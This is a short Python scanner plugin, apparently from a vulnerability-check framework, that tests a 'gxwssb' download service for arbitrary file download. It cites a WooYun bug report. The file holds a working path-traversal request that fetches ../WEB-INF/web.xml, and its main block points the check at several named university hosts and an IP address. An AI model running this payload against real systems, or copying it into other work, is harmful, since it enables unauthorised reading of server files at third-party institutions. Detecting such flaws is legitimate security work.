#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:天津神州助平台通用型任意下载
#Refer:http://www.wooyun.org/bugs/wooyun-2010-087767

def assign(service,arg):
    if service=="gxwssb":
        return True,arg 
    
def  audit(arg):
    url=arg+"gxwssb/fileDownloadmodel?name=../WEB-INF/web.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "filter-name" in res:
        security_hole(url)
    

if __name__=="__main__":
    from dummy import *
    audit(assign('gxwssb','http://fin.hrbnu.edu.cn:8080/')[1])
    audit(assign('gxwssb','http://wssb.muc.edu.cn/')[1])
    audit(assign('gxwssb','http://210.36.48.93:8080/')[1])